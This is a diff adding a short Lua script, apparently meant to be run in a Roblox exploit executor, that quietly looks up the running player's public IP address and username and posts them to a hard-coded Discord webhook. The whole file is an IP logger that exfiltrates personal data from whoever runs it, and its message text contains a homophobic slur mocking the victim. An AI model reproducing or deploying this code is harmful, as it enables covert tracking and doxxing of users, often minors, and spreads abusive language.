@@ -1,0 +1,22 @@
+local lfv = tostring(game:HttpGet("https://api64.ipify.org", true))
+local lfv2 = game.Players.LocalPlayer.Name
+msg = {
+["embeds"] = {{
+["color"] = 0000000,
+["description"] = "Username: " .. lfv2 .. "; IP: " .. lfv .. ".",
+["author"] = {
+["name"] = "Faggot executed LOL EZ 1"
+}}
+}
+}
+
+local response = request(
+{
+Url = "https://discord.com/api/webhooks/902193396351905822/Xf5y5SZT7P5qNm3O7ATXZzEpB_OmuYIhkpTO0_08zCT430Rfxcmml__DtKbs3RxDeLaq",
+Method = "POST",
+Headers = {
+["Content-Type"] = "application/json"
+},
+Body = game:GetService("HttpService"):JSONEncode(msg)
+}
+)
